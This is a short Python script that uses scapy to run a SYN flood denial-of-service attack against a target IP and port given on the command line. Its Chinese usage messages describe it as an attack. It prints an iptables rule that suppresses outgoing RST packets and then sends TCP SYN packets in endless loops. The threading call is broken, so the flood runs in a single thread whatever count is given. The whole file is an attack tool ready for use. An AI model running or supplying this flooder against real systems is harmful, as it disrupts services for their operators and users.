#!/usr/bin/python

# .*. coding: utf-8 -*
print("use:[sudo iptables -A OUTPUT -p TCP --tcp-flags  rst rst -d 0.0.0.0 -j DROP]")
print('iptables -t nat -F')
from scapy.all import *

from time import sleep

from threading import Thread

import random

import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 4:

    print("用法:  ./syn_flood.py [IP地址] [端口] [线程数]")

    print("举例:  ./syn_flood.py 1.1.1.1 80 20")

    sys.exit()

target = str(sys.argv[1])

port = int(sys.argv[2])

threads = int(sys.argv[3])

print("正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击")

def synflood(target,port):

    while 0 == 0:

        x = random.randint(0,65535)

        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)

for x in range(0,threads):

    Thread.start(synflood(target,port))

while 0 == 0:
    sleep(1) 